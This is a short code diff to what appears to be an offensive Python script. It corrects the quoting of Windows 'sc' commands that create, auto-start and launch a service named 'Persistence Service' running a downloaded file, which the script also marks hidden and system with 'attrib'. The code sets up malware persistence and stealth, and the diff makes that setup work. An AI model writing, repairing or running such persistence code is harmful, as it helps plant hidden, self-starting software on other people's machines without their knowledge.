@@ -25,11 +25,12 @@ deploy_command(fetch_file)
 attrib = f'attrib +h +s "{save_path}"'
 deploy_command(attrib)
 
-service = f'sc create Persistence Service binPath= "{save_path}"'
+service = f'sc create "Persistence Service" binPath= "{save_path}"'
 deploy_command(service)
 
-config = f'sc config Persistence Service start= auto'
+config = 'sc config "Persistence Service" start=auto'
 deploy_command(config)
 
-start = f'sc start Persistence Service'
+start = 'sc start "Persistence Service"'
 deploy_command(start)
+
